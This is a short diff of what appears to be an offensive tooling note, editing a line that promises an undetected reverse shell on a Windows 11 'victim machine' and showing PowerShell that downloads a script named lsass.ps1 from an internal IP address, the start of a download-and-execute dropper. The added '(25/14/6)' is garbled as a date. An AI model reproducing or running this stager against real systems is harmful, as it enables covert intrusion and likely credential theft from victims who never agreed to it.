@@ -1,4 +1,4 @@
-By runnning the fowlling dropper on the victim machine you can obtain a reverse shell that remains undetected!
+By runnning the following dropper on the Windows 11 victim machine you can obtain a reverse shell that remains undetected (25/14/6)!
 
 $wc = New-Object System.Net.WebClient
 $code = $wc.DownloadString("http://10.0.0.21/lsass.ps1")
